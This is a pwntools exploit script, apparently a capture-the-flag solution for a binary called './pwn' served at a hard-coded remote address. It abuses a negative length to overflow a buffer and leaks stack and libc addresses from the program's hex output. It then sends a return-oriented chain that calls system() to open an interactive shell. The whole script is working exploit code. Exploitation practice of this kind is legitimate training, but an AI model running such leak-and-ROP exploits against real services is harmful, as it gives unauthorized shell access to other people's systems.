from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 0
elf_path = "./pwn"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
# context(arch='amd64',os = 'linux')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        # r = gdb.debug(elf_path,'set debug-file-directory ./.debug/')
        # gdb.attach(r,'b* 0x4012ed')
        r = process(elf_path)
        gdb.attach(r)
        # pause()
        pass
    else:
        r = process(elf_path)
    
else:
    host = "39.106.48.123:31571"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset].decode(),16)

    show_addr(name,addr)
    return addr


elf = ELF(elf_path)
libc = ELF('./libc.so.6')

r.sendline(str(0).encode())

r.sendlineafter(b'Length: ',b'-1')
payload = b'A' * 99 + b'A' + b'\xff\xff\xff\xff'
r.sendafter(b'Data: ',payload)
r.recvuntil(b'Result in hex: ')
stack_rbp_addr = int(b''.join(r.recvuntil(b'7f').split(b' ')[-6:][::-1]),16)  + 0x28
show_addr('stack_rbp_addr',stack_rbp_addr)

r.sendline(str(0).encode())
r.sendlineafter(b'Length: ',b'-1')
payload = b'A' * 99 + b'A' + b'\xff\xff\xff\xff' + p64(stack_rbp_addr + 8)
r.sendafter(b'Data: ',payload)
libc.address = int(b''.join(r.recvuntil(b'7f').split(b' ')[-6:][::-1]),16) - 0x24083
show_addr('libc.address',libc.address)

rop = ROP(libc)
r.sendline(str(0).encode())
r.sendlineafter(b'Length: ',b'-1')
rop.raw(b'A' * 99 + b'A' + b'\xff\xff\xff\xff' + p64(stack_rbp_addr)+b'junkjunk')
rop.raw(rop.ret[0])
rop.rdi = libc.address + 0x00001B45BD
rop.system()
info(rop.dump())

r.sendafter(b'Data: ',rop.chain())

r.interactive()